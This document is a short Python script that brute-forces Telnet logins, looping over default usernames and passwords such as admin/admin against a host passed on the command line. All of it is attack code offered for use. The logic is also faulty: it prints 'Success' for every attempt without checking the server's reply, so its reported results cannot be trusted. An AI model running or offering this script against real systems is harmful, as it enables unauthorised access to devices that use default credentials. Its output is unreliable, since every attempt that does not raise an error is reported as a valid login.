import telnetlib
import sys

def brute_force_telnet(host, user_list, pass_list):
    for username in user_list:
        for password in pass_list:
            try:
                tn = telnetlib.Telnet(host)
                tn.read_until(b"login: ")
                tn.write(username.encode('ascii') + b"\n")
                tn.read_until(b"Password: ")
                tn.write(password.encode('ascii') + b"\n")
                print(f"Success: {username}:{password}")
                tn.close()
            except Exception:
                pass

if __name__ == "__main__":
    host = sys.argv[1]
    user_list = ["admin", "user"]
    pass_list = ["admin", "password"]
    brute_force_telnet(host, user_list, pass_list)
